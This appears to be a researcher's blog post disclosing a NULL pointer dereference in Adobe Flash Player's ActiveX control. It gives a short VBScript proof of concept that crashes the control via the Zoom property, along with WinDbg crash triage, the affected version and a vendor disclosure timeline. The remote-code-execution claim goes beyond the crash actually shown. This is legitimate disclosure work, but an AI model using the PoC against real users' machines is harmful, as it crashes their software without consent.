---
layout: post
title:  "Adobe Flash ActiveX - NULL Pointer Dereference"
date:   2018-09-26 03:39:03 +0700
tags:
    - NULL
---

Description
-----------
Adobe® Flash® Player is a lightweight browser plug-in and rich Internet application runtime that delivers consistent and engaging user experiences, stunning audio/video playback, and exciting gameplay.

ActiveX 101
-----------
ActiveX is a framework created by Microsoft to extend the functionality of the Component Object Model (COM) and Object Linking Embedding (OLE) and apply it to content downloaded from networks. 

Vulnerability Details
---------------------
Adobe Flash Player contained interface of a ActiveX. It is found that the ActiveX controls to be unsafe and permit code to be executed remotely by an attacker with capability connect user to a website containing malicious / exploit ActiveX code.

The issue can only be trigger on IE11 in Windows 10. Further investigation found the ActiveX **zoom** and **FrameNum** failed to check for value input (see POC below). Upon investigation Adobe didn't set Kill Bit for its ActiveX thus can allow any execution. Vulnerable CLSID, D27CDB6E-AE6D-11CF-96B8-444553540000 (zoom and FrameNum).

Steps to debug wscript.exe in WinDBG
```
1. Open executable wscript.exe in WinDBG, in the argument specify the path of WSF file.
2. Run the wscript (command 'g').
3. Crash will trigger upon execution.
```

Initial crash triage:
```
(bf34.bfb0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\System32\Macromed\Flash\Flash.ocx - 
Flash+0x33e553:
00007ffa06cde553 488b7950        mov     rdi,qword ptr [rcx+50h] ds:00000000`00000050=????????????????
```

Quick look in register found the value RCX contained NULL value. 
```
0:000> r
rax=0000000000040001 rbx=0000048441abd0a0 rcx=0000000000000000
rdx=000000ecb959d3e0 rsi=0000000000000000 rdi=0000022bee711600
rip=00007ffa06cde553 rsp=000000ecb959d380 rbp=000000ecb959d570
 r8=ffffffff80000000  r9=0000000000000000 r10=0000022bee6c0150
r11=000000ecb959d4c0 r12=000000ecb959d6c0 r13=0000000000000010
r14=000000ecb959d6b0 r15=fffffffffffffd71
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
Flash+0x33e553:
00007ffa`06cde553 488b7950        mov     rdi,qword ptr [rcx+50h] ds:00000000`00000050=????????????????
```

Proof-of-Concept - save as WSF extension (e.g. poc.wsf)
```
<object classid='clsid:D27CDB6E-AE6D-11CF-96B8-444553540000' id='target' />
<script language='vbscript'>
arg1=-1
target.Zoom arg1 
</script>
```

Crash Dump analysis
```
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

GetUrlPageData2 (WinHttp) failed: 12002.

DUMP_CLASS: 2

DUMP_QUALIFIER: 0

FAULTING_IP: 
Flash+33e553
00007ffa`06cde553 488b7950        mov     rdi,qword ptr [rcx+50h]

EXCEPTION_RECORD:  (.exr -1)
ExceptionAddress: 00007ffa06cde553 (Flash+0x000000000033e553)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000000
   Parameter[1]: 0000000000000050
Attempt to read from address 0000000000000050

FAULTING_THREAD:  0000bfb0

DEFAULT_BUCKET_ID:  NULL_CLASS_PTR_READ

PROCESS_NAME:  wscript.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE_STR:  c0000005

EXCEPTION_PARAMETER1:  0000000000000000

EXCEPTION_PARAMETER2:  0000000000000050

FOLLOWUP_IP: 
Flash+33e553
00007ffa`06cde553 488b7950        mov     rdi,qword ptr [rcx+50h]

READ_ADDRESS:  0000000000000050 

BUGCHECK_STR:  NULL_CLASS_PTR_READ

WATSON_BKT_PROCSTAMP:  b09bb563

WATSON_BKT_PROCVER:  5.812.10240.16384

PROCESS_VER_PRODUCT:  Microsoft ® Windows Script Host

WATSON_BKT_MODULE:  Flash.ocx

WATSON_BKT_MODSTAMP:  5ae55db5

WATSON_BKT_MODOFFSET:  33e553

WATSON_BKT_MODVER:  29.0.0.171

MODULE_VER_PRODUCT:  Shockwave Flash

BUILD_VERSION_STRING:  10.0.16299.431 (WinBuild.160101.0800)

MODLIST_WITH_TSCHKSUM_HASH:  4317f1b6873c340f3bd05b0c8a7da17d7123b967

MODLIST_SHA1_HASH:  0cfd81457a955698cadfc507758ee871767d7df9

NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

PRODUCT_TYPE:  1

SUITE_MASK:  272

ANALYSIS_SESSION_HOST:  DESKTOP-N8NGOGJ

ANALYSIS_SESSION_TIME:  06-04-2018 16:45:37.0273

ANALYSIS_VERSION: 10.0.14321.1024 amd64fre

THREAD_ATTRIBUTES: 
OS_LOCALE:  ENM

PROBLEM_CLASSES: 

NULL_CLASS_PTR_READ
    Tid    [0xbfb0]
    Frame  [0x00]: Flash

LAST_CONTROL_TRANSFER:  from 00007ffa06cb56df to 00007ffa06cde553

STACK_TEXT:  
000000ec`b959d380 00007ffa`06cb56df : 00000484`41abd0a0 00000000`00000000 000000ec`b959d570 00000000`00000000 : Flash+0x33e553
000000ec`b959d3b0 00007ffa`06db8c08 : 0000022b`f0794750 0000022b`f0794750 000000ec`b959d570 0000022b`f0794750 : Flash+0x3156df
000000ec`b959d470 00007ffa`436ad41f : 0000022b`ee711600 00007ffa`ffffffff 000000ec`b959d878 00007ffa`06db8aa0 : Flash!DllUnregisterServer+0x48b58
000000ec`b959d640 00007ffa`4369ef2e : 00000000`00000fff 00007ffa`4369ee6d 00000000`00000000 00000000`00000000 : OLEAUT32!DispCallFuncAmd64+0x7f
000000ec`b959d690 00007ffa`4369bd27 : 0000022b`f05e1ff4 00000000`00000000 0000022b`ee720608 0000022b`ee7678e0 : OLEAUT32!DispCallFunc+0x22e
000000ec`b959d760 00007ffa`06d823d6 : 04101100`00140004 00007ffa`22daf636 00000000`00000006 00000000`00000002 : OLEAUT32!CTypeInfo2::Invoke+0x3c7
000000ec`b959dae0 00007ffa`06dacc29 : 0000022b`ee711600 00000000`00000409 00000000`00000076 00000000`00000006 : Flash!DllUnregisterServer+0x12326
000000ec`b959db30 00007ffa`22dc2395 : 0000022b`f04b0550 00000000`00000076 0000022b`ee711600 000000ec`b959dce0 : Flash!DllUnregisterServer+0x3cb79
000000ec`b959db90 00007ffa`22db0a25 : 0000022b`ee711600 0000022b`f04b0550 00000000`00000000 0000022b`ee711600 : vbscript!IDispatchInvoke2+0x19d
000000ec`b959dc10 00007ffa`22dac5aa : 00000000`00000002 0000022b`f04b507c 0000022b`f04b507c 0000022b`f04bbc90 : vbscript!InvokeDispatch+0x985
000000ec`b959e030 00007ffa`22da60f3 : 000000ec`b959e510 00000000`00000000 000000ec`b959e510 00000000`00000000 : vbscript!CScriptRuntime::RunNoEH+0x63aa
000000ec`b959e470 00007ffa`22da3198 : 000000ec`b959e510 00000000`00000000 00000000`00000000 00000000`00000000 : vbscript!CScriptRuntime::Run+0x123
000000ec`b959e4d0 00007ffa`22dadd4c : 0000022b`f04bb250 0000022b`f04bb250 0000022b`f04b0550 00000000`00000000 : vbscript!CScriptEntryPoint::Call+0xe8
000000ec`b959e770 00007ffa`22da3bcb : 0000022b`ee69b3d0 000000ec`b959e889 00000000`00000000 00000000`00000000 : vbscript!CSession::Execute+0x20c
000000ec`b959e820 00007ffa`22da4ad9 : 0000022b`00000000 0000022b`f04bb250 00000000`00000000 00000000`00000000 : vbscript!COleScript::ExecutePendingScripts+0x19b
000000ec`b959e8f0 00007ffa`2f66842e : 00000000`00000000 0000022b`f04b0480 00000000`00000000 0000022b`f04b0480 : vbscript!COleScript::SetScriptState+0x69
000000ec`b959e930 00007ffa`2f670f77 : 0000022b`ee69000d 00007ff6`e7e15261 000000ec`b959e980 0000022b`ee69d609 : scrobj!ScriptEngine::Activate+0x2a
000000ec`b959e960 00007ffa`2f6708b5 : 00000000`00000000 00000000`00000000 000000ec`b959ea50 0000022b`ee69aab8 : scrobj!ComScriptlet::Inner::StartEngines+0xc3
000000ec`b959e9d0 00007ffa`2f670b48 : 0000022b`f04b8610 0000022b`ee69ab50 0000022b`ee69d5f0 0000022b`ee69ab40 : scrobj!ComScriptlet::Inner::Init+0x1dd
000000ec`b959ea70 00007ffa`2f66539b : 00000000`00000000 0000022b`ee69aab8 00000000`00000000 0000022b`ee69aba0 : scrobj!ComScriptlet::New+0x78
000000ec`b959eab0 00007ffa`2f665203 : 00000000`00000000 00000000`00000000 00000000`0000fde9 00000000`00000000 : scrobj!ComScriptletConstructor::CreateScriptletFromNode+0x27
000000ec`b959eaf0 00007ff6`e7e1973e : 00000000`00000000 000000ec`b959ebb9 00000000`00000000 000000ec`b959f530 : scrobj!ComScriptletConstructor::Create+0x63
000000ec`b959eb30 00007ff6`e7e148ed : 0000022b`ee6e62de 00000000`00000000 000000ec`b959f530 00000000`00000000 : wscript!CHost::RunXMLScript+0x552
000000ec`b959ec20 00007ff6`e7e161f1 : 000000ec`b959f580 000000ec`b959f580 000000ec`b959eff0 00000000`00000001 : wscript!CHost::Execute+0x29d
000000ec`b959eef0 00007ff6`e7e14141 : 00000000`00000114 00000000`00000002 0000022b`ee691550 0000022b`ee691640 : wscript!CHost::Main+0x5ad
000000ec`b959f500 00007ff6`e7e143a8 : 00000000`00000000 0000022b`ee6c2808 0000022b`ee691550 00000000`0000001f : wscript!RunScript+0x61
000000ec`b959f840 00007ff6`e7e12ab0 : 00007ff6`e7e10000 00000000`00000000 00000000`00000000 00000000`00000000 : wscript!WinMain+0x204
000000ec`b959f8a0 00007ffa`41cb1fe4 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : wscript!WinMainCRTStartup+0x70
000000ec`b959f940 00007ffa`43b0f061 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14
000000ec`b959f970 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21

THREAD_SHA1_HASH_MOD_FUNC:  e80f06a0475dc07165bfc81728f905ac479682b8

THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  e9eef3a5a3a9357a8b2185a6820322b41f9b71b6

THREAD_SHA1_HASH_MOD:  08d7f4f9343410143eecbe539461d84ea8efda13

FAULT_INSTR_CODE:  50798b48

SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  Flash+33e553

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: Flash

IMAGE_NAME:  Flash.ocx

DEBUG_FLR_IMAGE_TIMESTAMP:  5ae55db5

STACK_COMMAND:  ~0s ; kb

BUCKET_ID:  NULL_CLASS_PTR_READ_Flash+33e553

PRIMARY_PROBLEM_CLASS:  NULL_CLASS_PTR_READ_Flash+33e553

FAILURE_EXCEPTION_CODE:  c0000005

FAILURE_IMAGE_NAME:  Flash.ocx

BUCKET_ID_IMAGE_STR:  Flash.ocx

FAILURE_MODULE_NAME:  Flash

BUCKET_ID_MODULE_STR:  Flash

FAILURE_FUNCTION_NAME:  Unknown

BUCKET_ID_FUNCTION_STR:  Unknown

BUCKET_ID_OFFSET:  33e553

BUCKET_ID_MODTIMEDATESTAMP:  5ae55db5

BUCKET_ID_MODCHECKSUM:  1b95981

BUCKET_ID_MODVER_STR:  29.0.0.171

BUCKET_ID_PREFIX_STR:  NULL_CLASS_PTR_READ_

FAILURE_PROBLEM_CLASS:  NULL_CLASS_PTR_READ

FAILURE_SYMBOL_NAME:  Flash.ocx!Unknown

FAILURE_BUCKET_ID:  NULL_CLASS_PTR_READ_c0000005_Flash.ocx!Unknown

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/wscript.exe/5.812.10240.16384/b09bb563/Flash.ocx/29.0.0.171/5ae55db5/c0000005/0033e553.htm?Retriage=1

TARGET_TIME:  2018-06-04T08:45:38.000Z

OSBUILD:  16299

OSSERVICEPACK:  431

SERVICEPACK_NUMBER: 0

OS_REVISION: 0

OSPLATFORM_TYPE:  x64

OSNAME:  Windows 10

OSEDITION:  Windows 10 WinNt SingleUserTS

USER_LCID:  0

OSBUILD_TIMESTAMP:  1995-11-08 03:08:04

BUILDDATESTAMP_STR:  160101.0800

BUILDLAB_STR:  WinBuild

BUILDOSVER_STR:  10.0.16299.431

ANALYSIS_SESSION_ELAPSED_TIME: 570c

ANALYSIS_SOURCE:  UM

FAILURE_ID_HASH_STRING:  um:null_class_ptr_read_c0000005_flash.ocx!unknown

FAILURE_ID_HASH:  {fc7546b3-cbbe-7687-a761-c90b7fcd1642}

Followup:     MachineOwner
---------
```

Affected version of Adobe Flash
```
0:000> lmvm Flash
Browse full module list
start             end                 module name
00007ffa`069a0000 00007ffa`08631000   Flash      (export symbols)       C:\Windows\System32\Macromed\Flash\Flash.ocx
    Loaded symbol image file: C:\Windows\System32\Macromed\Flash\Flash.ocx
    Image path: C:\Windows\System32\Macromed\Flash\Flash.ocx
    Image name: Flash.ocx
    Browse all global symbols  functions  data
    Timestamp:        Sun Apr 29 13:52:53 2018 (5AE55DB5)
    CheckSum:         01B95981
    ImageSize:        01C91000
    File version:     29.0.0.171
    Product version:  29.0.0.171
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        2.0 Dll
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Adobe Systems, Inc.
    ProductName:      Shockwave Flash
    InternalName:     Adobe Flash Player 29.0
    OriginalFilename: Flash.ocx
    ProductVersion:   29,0,0,171
    FileVersion:      29,0,0,171
    FileDescription:  Adobe Flash Player 29.0 r0
    LegalCopyright:   Adobe® Flash® Player. Copyright © 1996-2018 Adobe Systems Incorporated. All Rights Reserved. Adobe and Flash are either trademarks or registered trademarks in the United States and/or other countries.
    LegalTrademarks:  Adobe Flash Player
   ```
   
Dicslosure Timeline
-------------------
1. [June 4, 2018] Issue reported.
2. Adobe PSIRT ack and asking for debugging / reproduction. Assigned tracking number (PSIRT-8421 and PSIRT-8422).
3. [July 20, 2018] Request for update. Vendor ack still working on it.
4. [Aug 25, 2018] Request for update. Vendor ack still working on it.
5. [Sept 26, 2018] Request for update. Vendor response issue has been resolved and asking for retest. Issue confirmed fix. No CVE assigned for the issue reported. Vendor will acknowledge in their page, https://helpx.adobe.com/security/acknowledgements.html.
   
   
